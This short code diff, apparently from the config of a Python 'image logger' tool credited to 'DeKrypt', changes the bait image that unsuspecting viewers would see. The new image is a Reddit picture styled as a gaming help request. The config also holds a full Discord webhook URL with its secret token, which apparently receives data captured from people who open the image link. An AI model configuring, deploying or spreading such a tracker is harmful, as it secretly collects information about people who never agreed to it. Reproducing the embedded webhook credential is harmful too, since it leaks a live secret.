@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1344723646924591335/7GDfLRtDXIYA4B10PdpahTcSuWHO9z35whRO_k_cHl5A4yD7fuIVfs_ovQZV44P-8LHH",
-    "image": "https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif", # You can also have a custom image by using a URL argument
+    "image": "https://preview.redd.it/can-someone-help-me-im-stuck-in-this-loading-screen-when-im-v0-ah6jkip092oa1.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
